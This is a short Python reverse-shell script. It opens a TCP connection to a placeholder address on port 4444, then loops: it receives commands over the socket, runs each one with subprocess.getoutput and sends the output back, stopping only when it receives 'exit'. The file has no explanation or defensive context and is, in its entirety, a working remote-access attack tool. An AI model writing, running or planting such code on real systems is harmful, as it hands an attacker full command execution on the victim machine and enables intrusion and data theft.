import socket as sk, subprocess, sys

sk = sk.socket(sk.AF_INET, sk.SOCK_STREAM)

RHOST = "TARGET IP ADDRESS"
RPORT = 4444

try:
    print(f"Connecting to {RHOST}:{RPORT}...")
    sk.connect((RHOST, RPORT))
except:
    print("Host is probably down or Connectivity issues!")
    sys.exit(1)

print("Connection Established...")

while True:
    input = sk.recv(1024).decode()
    if input == "exit":
        break
    output = subprocess.getoutput(input)
    sk.send(output.encode())


sk.close()
